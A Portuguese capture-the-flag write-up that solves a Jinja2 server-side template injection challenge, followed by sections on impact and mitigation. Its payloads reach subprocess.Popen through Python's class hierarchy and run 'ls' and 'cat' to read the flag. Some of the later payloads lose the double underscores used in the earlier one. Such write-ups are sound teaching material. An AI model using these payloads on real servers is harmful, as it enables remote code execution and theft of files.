# Note This
###### Solved by @biancardesouza

> This is a CTF about Web Exploitation

- [Página do desafio](https://notethis.discloud.app)

[![imagem-2026-02-25-174005591.png](https://i.postimg.cc/DZDjtsw5/imagem-2026-02-25-174005591.png)](https://postimg.cc/1nGrF86N)

### Análise Inicial

Quando entramos na página, a primeira coisa que podemos ver é um campo para que digitemos uma nota. Se clicarmos em "enviar", ela será salva e a página atualizará, nos permitindo visualizá-la.

Se olharmos embaixo do campo de texto, temos a dica que se trata de um desafio relacionado a [SSTI](https://blog.bughunt.com.br/o-que-e-ssti-server-side-template-injection/) e que a página foi feita utilizando [Jinja2](https://www.treinaweb.com.br/blog/o-que-e-o-jinja2).

### Processo

1. O primeiro passo é verificar se o campo de entrada interpreta expressões do Jinja2. No campo de notas, escreveremos:

```jinja
{{ 7*7 }}
```

[![imagem-2026-02-25-174846051.png](https://i.postimg.cc/zBV5CnQK/imagem-2026-02-25-174846051.png)](https://postimg.cc/BL9ds14n)

O resultado confirma que a entrada está sendo interpretada pelo mecanismo de template do servidor.

2. Após confirmarmos a injeção, vamos explorar objetos internos do Python. O próximo passo é inserir o seguinte comando no campo de texto:

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

[![imagem-2026-02-25-175206406.png](https://i.postimg.cc/Zn4HkchC/imagem-2026-02-25-175206406.png)](https://postimg.cc/WFYgg0zv)

Isso retorna uma lista enorme de subclasses carregadas na aplicação.

3. Agora nós precisamos achar a classe [subprocess.Popen](https://medium.com/@404c3s4r/subprocess-no-python-937a3c3bd518). Para achá-la, digitaremos:

```jinja
{% for c in ''._class.mro[1].subclasses_() %}
{% if 'Popen' in c|string %}
{{ loop.index0 }} : {{ c }}
{% endif %}
{% endfor %}
```

[![aaaaabbbb.jpg](https://i.postimg.cc/L6HSvKwr/aaaaabbbb.jpg)](https://postimg.cc/6T1F5S90)

Isso permitiu identificar a posição da classe em questão.

4. Agora iremos procurar onde está localizada a flag. Primeiro rodaremos o seguinte comando:

```jinja
{{''._class.mro[1].subclasses_()[X](
'ls -la',
shell=True,
stdout=-1
).communicate()[0]}}
```

[![Whats-App-Image-2026-02-17-at-15-47-47.jpg](https://i.postimg.cc/nhhQyWj6/Whats-App-Image-2026-02-17-at-15-47-47.jpg)](https://postimg.cc/JGSnJPQq)

Esse comando nos permite ver todos os diretórios e arquivos que temos, como em um terminal. Vamos acessar "secrets777666" para que vejamos o que tem dentro dele.

```jinja
{{''._class.mro[1].subclasses_()[X](
'ls -la secrets777666',
shell=True,
stdout=-1
).communicate()[0]}}
```

[![Whats-App-Image-2026-02-17-at-15-47-47-(1).jpg](https://i.postimg.cc/t4s4tGVX/Whats-App-Image-2026-02-17-at-15-47-47-(1).jpg)](https://postimg.cc/75y4wcVc)

Agora vamos acessar "flag.txt".

```jinja
{{''._class.mro[1].subclasses_()[X](
'cat secrets777666/flag.txt',
shell=True,
stdout=-1
).communicate()[0]}}
```

[![Whats-App-Image-2026-02-17-at-15-47-47-(2).jpg](https://i.postimg.cc/fbxZBzWT/Whats-App-Image-2026-02-17-at-15-47-47-(2).jpg)](https://postimg.cc/WDbQ4PJQ)

**Flag:** `DUCK{777_KNOW_ALL_YOUR_TEMPLATES_777}`

### Vulnerabilidade

A vulnerabilidade explorada foi realmente SSTI, como o site indicava, utilizando o motor Jinja2. Essa vulnerabilidade ocorre quando entradas do usuário são inseridas diretamente em templates do lado do servidor sem validação adequada, permitindo que o usuário injete expressões que são interpretadas pelo motor de template. Ela pode levar a:

* Execução Remota de Código (RCE);
* Vazamento de arquivos sensíveis;
* Comprometimento total do servidor;
* Escalada de privilégios.

No desafio, pudemos navegar pela hierarquia de classes, executar comandos do sistema e ler o conteúdo do arquivo "flag.txt", nosso texto alvo.

### Mitigação

Em um sistema real, podemos evitar essa vulnerabilidade da seguinte maneira:

* Nunca renderizar entrada do usuário diretamente;
* Utilizar variáveis seguras no template;
* Habilitar autoescape (conversão automática de caracteres especiais em HTML para suas respectivas entidades);
* Sanitização e validação de entrada.

### Conclusão

O desafio demonstrou como uma simples falha na renderização de templates pode comprometer completamente uma aplicação. Como dito na seção sobre a vulnerabilidade, pudemos navegar pela hierarquia de classes, executar comandos do sistema e ler o conteúdo do arquivo "flag.txt", coisas que são extremamente críticas em ambientes reais. Alguém pode tomar controle do site se souber como explorar a seu favor essas falhas técnicas.

Devemos manter boas práticas (citadas na seção de mitigação) para que nosso site seja seguro tanto para os desenvolvedores quanto para os clientes.